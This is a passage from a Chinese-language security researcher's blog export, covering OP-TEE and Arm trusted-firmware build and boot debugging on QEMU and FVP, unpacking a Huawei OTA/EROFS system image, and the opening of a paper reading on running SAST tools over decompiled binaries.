<h2 id="后续-amp-问题"><a href="#后续-amp-问题" class="headerlink" title="后续&amp;问题"></a>后续&amp;问题</h2><p>这个方案主要是效率实在是太差了，性能损耗都在jvm获取那里了，本来也是工作之余的一个小点子，后面也没深入去看了，个人最开始的想法是 winafl模式搬到安卓上 lol…</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html">https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html</a></p>
<p><a href="https://github.com/googleprojectzero/p0tools/blob/master/TrapFuzz/trapfuzz.patch">https://github.com/googleprojectzero/p0tools/blob/master/TrapFuzz/trapfuzz.patch</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>native</tag>
        <tag>jni</tag>
        <tag>honggfuzz</tag>
        <tag>trapfuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>optee学习篇(1) 环境&amp;调试</title>
    <url>/2022/08/24/optee%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>本篇主要是环境配置、调试、流程梳理</p>
<span id="more"></span>

<h3 id="qemu-v8环境搭建"><a href="#qemu-v8环境搭建" class="headerlink" title="qemu_v8环境搭建"></a>qemu_v8环境搭建</h3><blockquote>
<p><a href="https://optee.readthedocs.io/en/latest/building/prerequisites.html">https://optee.readthedocs.io/en/latest/building/prerequisites.html</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ repo init -u https://github.com/OP-TEE/manifest.git -m qemu_v8.xml</span><br><span class="line">$ repo sync -c -j8</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ make toolchains</span><br><span class="line">$ make run</span><br></pre></td></tr></table></figure>

<p>同步下来的仓库如下</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220822175933034.png" alt="image-20220822175933034"></p>
<p>运行一下试试看:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824161556316.png" alt="image-20220824161556316"></p>
<p>需要指定版本跑的话 : <code>make -f qemu_v8.mk run-only</code></p>
<blockquote>
<p><a href="https://optee.readthedocs.io/en/latest/debug/index.html">https://optee.readthedocs.io/en/latest/debug/index.html</a></p>
</blockquote>
<p>这里以qemu-v8为例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">make  DEBUG=1  -f qemu_v8.mk all</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make DEBUG=1 -f qemu_v8.mk run-only</span><br></pre></td></tr></table></figure>

<p>因为Makefile中启动的时候已经写了设置了 <code>-s -S</code>了 ，所以可以直接连接</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824163338069.png" alt="image-20220824163338069"></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824163032421.png" alt="image-20220824163032421"></p>
<p>可以从<a href="https://developer.arm.com/downloads/-/gnu-a">这里</a>下载对应的gdb来用</p>
<p>装了<code>libncurses5-dev</code>还是找不到so的话，可以参考 <a href="https://www.cnblogs.com/wanglouxiaozi/p/14987053.html">https://www.cnblogs.com/wanglouxiaozi/p/14987053.html</a></p>
<p><code>gdb-multiarch</code> 也可以，更好用</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824174332829.png" alt="image-20220824174332829"></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824174546625.png" alt="image-20220824174546625"></p>
<p>符号加载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bl1 --- /home/work/optee/trusted-firmware-a/build/qemu/debug/bl1/bl1.elf</span><br><span class="line">bl2 ---  /home/work/optee/trusted-firmware-a/build/qemu/debug/bl2/bl2.elf</span><br><span class="line">bl31 ---  /home/work/optee/trusted-firmware-a/build/qemu/debug/bl31/bl31.elf </span><br><span class="line">bl32(teeOS)  ----  /home/work/optee/optee_os/out/arm/core/tee.elf</span><br><span class="line">bl33(UEFI)  ---  /home/work/optee/edk2/Build/  </span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824175034184.png" alt="image-20220824175034184"></p>
<h3 id="fvp可视化调试环境搭建"><a href="#fvp可视化调试环境搭建" class="headerlink" title="fvp可视化调试环境搭建"></a>fvp可视化调试环境搭建</h3><h4 id="代码获取"><a href="#代码获取" class="headerlink" title="代码获取"></a>代码获取</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ repo init -u https://github.com/OP-TEE/manifest.git -m fvp.xml </span><br><span class="line">$ repo sync -j4 -c</span><br><span class="line">Updating depot_tools...</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="工具链"><a href="#工具链" class="headerlink" title="工具链"></a>工具链</h4><p>需要下载 <code>FVP_Base_RevC-2xAEMvA_11.18_16_Linux64.tgz</code>并解压到<code>optee-fvp</code>目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tar -zxvf ../FVP_Base_RevC-2xAEMvA_11.18_16_Linux64.tgz -C .</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># work @ work-virtual-machine in ~/optee-fvp [23:34:36] </span></span><br><span class="line">$ ls -al</span><br><span class="line">total 72</span><br><span class="line">drwxrwxr-x 18 work work 4096 Sep 22 23:32 .</span><br><span class="line">drwx------ 70 work work 4096 Sep 22 23:34 ..</span><br><span class="line">drwxrwxr-x 10 work work 4096 Sep 22 23:32 Base_RevC_AEMvA_pkg</span><br><span class="line">drwxrwxr-x 12 work work 4096 Sep 22 23:26 build</span><br><span class="line">drwxrwxr-x 14 work work 4096 Sep 22 23:26 buildroot</span><br><span class="line">drwxrwxr-x 50 work work 4096 Sep 22 23:26 edk2</span><br><span class="line">drwxrwxr-x  4 work work 4096 Sep 22 23:26 edk2-platforms</span><br><span class="line">drwxrwxr-x 14 work work 4096 Sep 22 23:26 grub</span><br><span class="line">drwxr-xr-x  3 work work 4096 Jun 16 10:34 license_terms</span><br><span class="line">drwxrwxr-x 24 work work 4096 Sep 22 23:26 linux</span><br><span class="line">drwxrwxr-x 14 work work 4096 Sep 22 23:26 mbedtls</span><br><span class="line">drwxrwxr-x  5 work work 4096 Sep 22 23:26 ms-tpm-20-ref</span><br><span class="line">drwxrwxr-x  9 work work 4096 Sep 22 23:26 optee_client</span><br><span class="line">drwxrwxr-x 10 work work 4096 Sep 22 23:26 optee_examples</span><br><span class="line">drwxrwxr-x 10 work work 4096 Sep 22 23:26 optee_os</span><br><span class="line">drwxrwxr-x  7 work work 4096 Sep 22 23:26 optee_test</span><br><span class="line">drwxrwxr-x  7 work work 4096 Sep 22 23:26 .repo</span><br><span class="line">drwxrwxr-x 19 work work 4096 Sep 22 23:26 trusted-firmware-a</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><blockquote>
<p>编译流程参考上面qemu_v8部分</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># work @ work-virtual-machine in ~/optee-fvp [23:35:06]</span></span><br><span class="line">$ cp -rf Base_RevC_AEMvA_pkg Foundation_Platformpkg <span class="comment"># build toolchains的时候文件夹名需要改一下</span></span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ make toolchains</span><br><span class="line">$ make DEBUG=1 FVP_USE_BASE_PLAT=y  -f fvp.mk all   </span><br></pre></td></tr></table></figure>

<h4 id="开启调试"><a href="#开启调试" class="headerlink" title="开启调试"></a>开启调试</h4><p>修改build/fvp.mk ，以便启动时进入调试模式</p>
<p>添加:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-I \</span><br><span class="line">--iris-allow-remote\</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment"># Run targets</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment"># This target enforces updating root fs etc</span></span><br><span class="line">run: all</span><br><span class="line">        $(MAKE) run-only</span><br><span class="line"></span><br><span class="line">ifeq ($(FVP_USE_BASE_PLAT),y)</span><br><span class="line">FVP_ARGS ?= \</span><br><span class="line">        -I \</span><br><span class="line">        --iris-allow-remote\</span><br><span class="line">        -C bp.ve_sysregs.exit_on_shutdown=1 \</span><br><span class="line">        -C cache_state_modelled=0 \</span><br><span class="line">        -C pctl.startup=0.0.0.0 \</span><br><span class="line">        -C cluster0.NUM_CORES=4 \</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> build </span><br><span class="line">make DEBUG=1 FVP_USE_BASE_PLAT=y  -f fvp.mk run-only</span><br></pre></td></tr></table></figure>



<h4 id="ARM-Developer-Studio连接"><a href="#ARM-Developer-Studio连接" class="headerlink" title="ARM Developer Studio连接"></a>ARM Developer Studio连接</h4><p>启动的时候需要license，注册个账号就行，先试用。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220924200021216.png" alt="image-20220924200021216"></p>
<p>启动之后，选择 : <code>File-&gt;New-&gt;Model Connection </code></p>
<p>模型选择 :  Base_RevC_AEMvA  和 <code>Base_RevC_AEMvA</code> 都没法直接调试，好像是模型没装好 :(</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220924200407393.png" alt="image-20220924200407393"></p>
<p>点Finish之后，需要手动选择，连接本地的模型 <code>localhost 7100</code></p>
<p>加载了bl31的符号，然后对入口下断: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b *EL3:0x0000000004003000</span><br><span class="line"></span><br><span class="line">add-symbol-file /home/muhe/Study/optee-fvp/trusted-firmware-a/build/fvp/debug/bl31/bl31.elf</span><br></pre></td></tr></table></figure>



<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220924204537245.png" alt="image-20220924204537245"></p>
<p>芜湖 🛫️ </p>
<h2 id="ARM-安全架构"><a href="#ARM-安全架构" class="headerlink" title="ARM 安全架构"></a>ARM 安全架构</h2><blockquote>
<p>ARM v8 的文档</p>
</blockquote>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825135100483.png" alt="image-20220825135100483"></p>
<ul>
<li>分三个异常等级</li>
<li>两个“世界”，non-secure 和 secure</li>
</ul>
<p><code>opteeos</code>跑在<code> secure world</code>，<code>ta</code>在<code>secure world</code>的上层(<code>el0</code>); <code>linux</code>在<code>non-secure world</code>，<code>ca</code>在<code>el0</code></p>
<p><code>optee</code>项目中还有个``atf<code>，这个跑在</code>el3`。</p>
<blockquote>
<p>  该图来自<a href="https://edu.csdn.net/lecturer/6964">周贺贺老师的OPTEE系列</a>课程中</p>
</blockquote>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825135607360.png" alt="image-20220825135607360"></p>
<h2 id="OPTEE-启动流程"><a href="#OPTEE-启动流程" class="headerlink" title="OPTEE 启动流程"></a>OPTEE 启动流程</h2><p>这里我直接用了<a href="https://edu.csdn.net/lecturer/6964">周贺贺老师OPTEE系列课程中</a>的图，我在对着代码分析的时候结合这个图感觉十分的清晰，有助于理解 :)</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220901215718045.png" alt="image-20220901215718045"></p>
<p>先来看大概的启动流程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">bl31_entrypoint (trusted-firmware-a/bl31/aarch64/bl31_entrypoint.S)</span><br><span class="line">    bl31_main (trusted-firmware-a/bl31/bl31_main.c)</span><br><span class="line">        runtime_svc_init (trusted-firmware-a/common/runtime_svc.c)</span><br><span class="line">            opteed_setup (trusted-firmware-a/services/spd/opteed/opteed_main.c DECLARE_RT_SVC里定义)</span><br><span class="line">                bl31_plat_get_next_image_ep_info(SECURE) </span><br><span class="line">                opteed_init_optee_ep_state</span><br><span class="line">                bl31_register_bl32_init(&amp;opteed_init);</span><br><span class="line"></span><br><span class="line">        bl32_init // 这个函数就是opteed_init，在上面注册的    </span><br><span class="line">            // 进入tee</span><br><span class="line">            opteed_synchronous_sp_entry(optee_ctx);</span><br><span class="line">                opteed_enter_sp(&amp;optee_ctx-&gt;c_rt_ctx);</span><br><span class="line">            // 出tee</span><br><span class="line">    bl31_prepare_next_image_entry (进入uboot)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>下断点的時候注意，切换到对应的阶段之后再去 file xxx 加载符号</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file /home/work/optee/trusted-firmware-a/build/qemu/debug/bl1/bl1.elf</span><br><span class="line">file /home/work/optee/trusted-firmware-a/build/qemu/debug/bl2/bl2.elf</span><br><span class="line">file /home/work/optee/trusted-firmware-a/build/qemu/debug/bl31/bl31.elf </span><br><span class="line">file /home/work/optee/optee_os/out/arm/core/tee.elf</span><br></pre></td></tr></table></figure>

<p>比如下面要进入tee的时候</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/from_atf_to_tee.png" alt="ready_enter_tee"></p>
<p>加载符号之后: </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/tee.png" alt="tee"></p>
<h3 id="ads可视化流程梳理"><a href="#ads可视化流程梳理" class="headerlink" title="ads可视化流程梳理"></a>ads可视化流程梳理</h3><blockquote>
<p>  ads可视化调试记录</p>
</blockquote>
<h4 id="bl1"><a href="#bl1" class="headerlink" title="bl1"></a>bl1</h4><blockquote>
<p>  add-symbol-file /home/muhe/Study/optee-fvp/trusted-firmware-a/build/fvp/debug/bl1/bl1.elf</p>
</blockquote>
<h4 id="bl2"><a href="#bl2" class="headerlink" title="bl2"></a>bl2</h4><blockquote>
<p>  b *EL1S:0x0000000004022000 </p>
</blockquote>
<blockquote>
<p>  add-symbol-file /home/muhe/Study/optee-fvp/trusted-firmware-a/build/fvp/debug/bl2/bl2.elf</p>
</blockquote>
<h4 id="bl31"><a href="#bl31" class="headerlink" title="bl31"></a>bl31</h4><blockquote>
<p>  b *EL3:0x0000000004003000</p>
</blockquote>
<blockquote>
<p>  add-symbol-file /home/muhe/Study/optee-fvp/trusted-firmware-a/build/fvp/debug/bl31/bl31.elf</p>
</blockquote>
<h4 id="bl32"><a href="#bl32" class="headerlink" title="bl32"></a>bl32</h4><blockquote>
<p>  b *EL1S:0x6000000</p>
<p>  add-symbol-file /home/muhe/Study/optee-fvp/optee_os/out/arm/core/tee.elf</p>
</blockquote>
<p>UEFI 的符号加载比较特殊， 这个部分是相对地址， 并且很多模块是动态加载的， 断点下到加载UEFI的地址， 也就是BL31 跳转到BL33时的地址。 断下后，</p>
<p>commands下通过 cmd_load_symbols 加载， 执行前先要弄清楚几个参数  </p>
<blockquote>
<p>/home/muhe/Study/optee-fvp/edk2/ArmPlatformPkg/Scripts/Ds5/cmd_load_symbols.py</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">def usage():</span><br><span class="line">    print &quot;-v,--verbose&quot;</span><br><span class="line">    print &quot;-a,--all: Load all symbols&quot;</span><br><span class="line">    print &quot;-l,--report=: Filename for the EDK2 report log&quot;</span><br><span class="line">    print &quot;-m,--sysmem=(base,size): System Memory region&quot;</span><br><span class="line">    print &quot;-f,--fv=(base,size): Firmware region&quot;</span><br><span class="line">    print &quot;-r,--rom=(base,size): ROM region&quot;</span><br></pre></td></tr></table></figure>

<p>-m 参数在  </p>
<blockquote>
<p>  /home/muhe/Study/optee-fvp/edk2-platforms/Platform/ARM/VExpressPkg/ArmVExpress-FVP-AArch64.dsc</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># <span class="function">System <span class="title">Memory</span> <span class="params">(<span class="number">2</span>GB - <span class="number">16</span>MB of Trusted DRAM at the top of the <span class="number">32b</span>it address space)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">gArmTokenSpaceGuid.PcdSystemMemoryBase|0x80000000</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">gArmTokenSpaceGuid.PcdSystemMemorySize|0x7F000000</span></span><br></pre></td></tr></table></figure>



<p>-f 参数在  </p>
<blockquote>
<p>  /home/muhe/Study/optee-fvp/edk2-platforms/Platform/ARM/VExpressPkg/ArmVExpress-FVP-AArch64.fdf </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[FD.FVP_AARCH64_EFI]</span><br><span class="line"></span><br><span class="line">!ifdef ARM_FVP_RUN_NORFLASH</span><br><span class="line"></span><br><span class="line">BaseAddress   = <span class="number">0x08000000</span>|gArmTokenSpaceGuid.PcdFdBaseAddress  # The base address of the Firmware in Flash0.</span><br><span class="line"></span><br><span class="line">!<span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">BaseAddress   = <span class="number">0x88000000</span>|gArmTokenSpaceGuid.PcdFdBaseAddress  # UEFI in DRAM + <span class="number">128</span>MB.</span><br><span class="line"></span><br><span class="line">!endif</span><br><span class="line"></span><br><span class="line">Size          = <span class="number">0x04000000</span>|gArmTokenSpaceGuid.PcdFdSize         # The size in bytes of the device (<span class="number">64</span>MiB).</span><br><span class="line"></span><br><span class="line">ErasePolarity = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="bl33"><a href="#bl33" class="headerlink" title="bl33"></a>bl33</h4><h4 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h4><blockquote>
<p>  b *EL2N:0x88000000</p>
</blockquote>
<p>断点触发后， 执行下面的命令加载符号。 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /home/muhe/Study/optee-fvp/edk2/ArmPlatformPkg/Scripts/Ds5/cmd_load_symbols.py  -a  -m (0x80000000, 0x7F000000)  -f (0x88000000, 0x04000000) </span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">info files</span><br><span class="line">Symbols from <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/ArmPlatformPkg/PrePi/PeiUniCore/DEBUG/ArmPlatformPrePiUniCore.dll&quot;</span>.</span><br><span class="line">Local <span class="built_in">exec</span> file:</span><br><span class="line">        <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/ArmPlatformPkg/PrePi/PeiUniCore/DEBUG/ArmPlatformPrePiUniCore.dll&quot;</span>, file <span class="built_in">type</span> ELF64.</span><br><span class="line">        Entry point: EL2N:0x0000000088000800.</span><br><span class="line">        EL2N:0x0000000088000800 - EL2N:0x0000000088018AD7 is .text</span><br><span class="line">        EL2N:0x0000000088019000 - EL2N:0x000000008801916F is .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>DxeCore的加载这个脚本处理不了，还是要自己加载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-symbol-file /home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/MdeModulePkg/Core/Dxe/DxeMain/DEBUG/DxeCore.dll 0x00fe3d3000</span><br></pre></td></tr></table></figure>

<p>现在就正常了:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Symbols from <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/ArmPlatformPkg/PrePi/PeiUniCore/DEBUG/ArmPlatformPrePiUniCore.dll&quot;</span>.</span><br><span class="line">Local <span class="built_in">exec</span> file:</span><br><span class="line">        <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/ArmPlatformPkg/PrePi/PeiUniCore/DEBUG/ArmPlatformPrePiUniCore.dll&quot;</span>, file <span class="built_in">type</span> ELF64.</span><br><span class="line">        Entry point: EL2N:0x0000000088000800.</span><br><span class="line">        EL2N:0x0000000088000800 - EL2N:0x0000000088018AD7 is .text</span><br><span class="line">        EL2N:0x0000000088019000 - EL2N:0x000000008801916F is .data</span><br><span class="line">Symbols from <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/MdeModulePkg/Core/Dxe/DxeMain/DEBUG/DxeCore.dll&quot;</span>.</span><br><span class="line">Local <span class="built_in">exec</span> file:</span><br><span class="line">        <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/MdeModulePkg/Core/Dxe/DxeMain/DEBUG/DxeCore.dll&quot;</span>, file <span class="built_in">type</span> ELF64.</span><br><span class="line">        Entry point: EL2N:0x00000000FE3D4000.</span><br><span class="line">        EL2N:0x00000000FE3D4000 - EL2N:0x00000000FE41AEBF is .text</span><br><span class="line">        EL2N:0x00000000FE41B000 - EL2N:0x00000000FE435860 is .data</span><br></pre></td></tr></table></figure>

<h4 id="GRUB"><a href="#GRUB" class="headerlink" title="GRUB"></a>GRUB</h4><p>TODO，这部分一直没时间搞，先挂起了</p>
<h4 id="Linux-Kernel"><a href="#Linux-Kernel" class="headerlink" title="Linux Kernel"></a>Linux Kernel</h4><blockquote>
<p>  BL33是UEFl,其实UEFI 还会引导grub2, 这里grub2作为一个UEFl的driver(or 应用)被UEFl加载, grub执行完毕,引导linux时,其实linux 内核也打包作为一个UEFl的应用了,所以BL33的执行过程是, UEFI-＞ grub-&gt;linux内核的efi stub -＞ linux内核</p>
</blockquote>
<p>加载符号，注意EL1N：0，因为内核主要运行在EL1N</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-symbol-file /home/muhe/Study/optee-fvp/linux/vmlinux EL1N:0</span><br></pre></td></tr></table></figure>

<p>根据启动流程 : </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__HEAD</span><br><span class="line">        primary_entry</span><br><span class="line">                __primary_switch</span><br><span class="line">                        __enable_mmu</span><br><span class="line">                        __primary_switched</span><br><span class="line">                                设置异常向量表 // `adr_l       x8, vectors`</span><br><span class="line">                                start_kernel()</span><br></pre></td></tr></table></figure>

<p>我们可以对<code>__primary_switch</code> 下断，如果符号对不上，可以根据地址下断</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muhe-NUC11PAHi5 in ~/Study/optee-fvp/linux on git:29aee39cf x [23:24:42]</span></span><br><span class="line">$ cat System.map | grep <span class="string">&quot;primary_switched&quot;</span></span><br><span class="line">ffff80000919032c t __primary_switched</span><br></pre></td></tr></table></figure>



<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/debug_linux_kernel.png" alt="debug_linux_kernel"></p>
<h4 id="JVM设置"><a href="#JVM设置" class="headerlink" title="JVM设置"></a>JVM设置</h4><p>修改ads的jvm，否则调试的时候容易oom影响体验</p>
<blockquote>
<p><a href="https://developer.arm.com/documentation/ka003567/latest">https://developer.arm.com/documentation/ka003567/latest</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muhe-NUC11PAHi5 in /usr/arm/developmentstudio-2022.1/sw/ide [20:20:40]</span></span><br><span class="line">$ cat armds_ide.ini</span><br><span class="line">-startup</span><br><span class="line">plugins/org.eclipse.equinox.launcher_1.6.400.v20210924-0641.jar</span><br><span class="line">--launcher.library</span><br><span class="line">plugins/org.eclipse.equinox.launcher.gtk.linux.x86_64_1.2.400.v20211117-0650</span><br><span class="line">-vm</span><br><span class="line">../java/lib/server/libjvm.so</span><br><span class="line">-vmargs</span><br><span class="line">--add-opens=java.base/java.io=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/sun.nio.ch=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/java.lang=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/java.util=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/java.nio.charset=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/java.nio=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/java.lang.reflect=ALL-UNNAMED</span><br><span class="line">-Dnashorn.args=--no-deprecation-warning</span><br></pre></td></tr></table></figure>



<p>添加参数 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-Xms4096m </span><br><span class="line">-Xmx4096m </span><br><span class="line">-Xmn256m</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://download.csdn.net/course/detail/37655">https://download.csdn.net/course/detail/37655</a></p>
<p><a href="https://optee.readthedocs.io/en/latest/">https://optee.readthedocs.io/en/latest/</a></p>
<p><a href="https://armv8-ref.codingbelief.com/zh/">https://armv8-ref.codingbelief.com/zh/</a></p>
<p><a href="https://edu.csdn.net/lecturer/6964">https://edu.csdn.net/lecturer/6964</a></p>
]]></content>
      <categories>
        <category>optee</category>
      </categories>
      <tags>
        <tag>optee</tag>
      </tags>
  </entry>
  <entry>
    <title>HW OTA unpack</title>
    <url>/2022/09/02/HW-OTA-unpack/</url>
    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="unzip解开OTA包"><a href="#unzip解开OTA包" class="headerlink" title="unzip解开OTA包"></a>unzip解开OTA包</h3><span id="more"></span>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825111641389.png" alt="image-20220825111641389"></p>
<p>我们的目标在 update_sd_base.zip里，其他部分咨询了是一些出厂带的APP，比如里面就看到了今日头条 抖音啥的。</p>
<p>直接解开 update_sd_base.zip 到下一步</p>
<h3 id="从UPDATE-APP提取SYSTEM"><a href="#从UPDATE-APP提取SYSTEM" class="headerlink" title="从UPDATE.APP提取SYSTEM"></a>从UPDATE.APP提取SYSTEM</h3><p>直接用  <a href="https://github.com/jenkins-84/split_updata.pl/blob/master/splitupdate">https://github.com/jenkins-84/split_updata.pl/blob/master/splitupdate</a> 来分割就行</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825111723396.png" alt="image-20220825111723396"></p>
<h3 id="unpack-erofs"><a href="#unpack-erofs" class="headerlink" title="unpack erofs"></a>unpack erofs</h3><h4 id="方法1-simg2img然后挂在erofs-kernel-5-4"><a href="#方法1-simg2img然后挂在erofs-kernel-5-4" class="headerlink" title="方法1: simg2img然后挂在erofs(kernel 5.4)"></a>方法1: simg2img然后挂在erofs(kernel 5.4)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/android-simg2img/simg2img SYSTEM.img system1.img</span><br><span class="line">sudo mount -t erofs system1.img 1 -oloop</span><br></pre></td></tr></table></figure>



<p>尝试读文件的时候发现报错</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825111833524.png" alt="image-20220825111833524"></p>
<p>dmesg发现 : </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825111906816.png" alt="image-20220825111906816"></p>
<h4 id="方法2-直接使用-extractor里的-erofs-tools-py-来直接把system镜像解开"><a href="#方法2-直接使用-extractor里的-erofs-tools-py-来直接把system镜像解开" class="headerlink" title="方法2: 直接使用 extractor里的 erofs_tools.py 来直接把system镜像解开"></a>方法2: 直接使用 extractor里的 erofs_tools.py 来直接把system镜像解开</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/extracotr/erofs_tool.py extract --verify-zip system1.img harmony_system</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/60617375">https://zhuanlan.zhihu.com/p/60617375</a></p>
<p><a href="https://github.com/jenkins-84/split_updata.pl">https://github.com/jenkins-84/split_updata.pl</a></p>
<p><a href="https://github.com/srlabs/extractor">https://github.com/srlabs/extractor</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>EROFS</tag>
      </tags>
  </entry>
  <entry>
    <title>Paper read &lt;&lt;The Convergence of Source Code and Binary Vulnerability Discovery – A Case Study&gt;&gt;</title>
    <url>/2022/09/12/Paper-read-The-Convergence-of-Source-Code-and-Binary-Vulnerability-Discovery-%E2%80%93-A-Case-Study/</url>
    <content><![CDATA[<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a><code>Background</code></h2><p>  最近阅读了一篇论文<code>&lt;&lt;The Convergence of Source Code and Binary Vulnerability Discovery – A Case Study&gt;&gt;</code>，很巧合的是论文的研究中，关于将SAST工具应用于二进制文件(通过decompiler)，即获取伪代码之后，在伪代码上跑SAST工具来找漏洞这个模式我和<code>@C0ss4ck</code>一起做过，在我们收到一些成效之后发现也有人做了<a href="https://security.humanativaspa.it/automating-binary-vulnerability-discovery-with-ghidra-and-semgrep/">类似的工作</a>，不过他好像没有特别深入 :D </p>
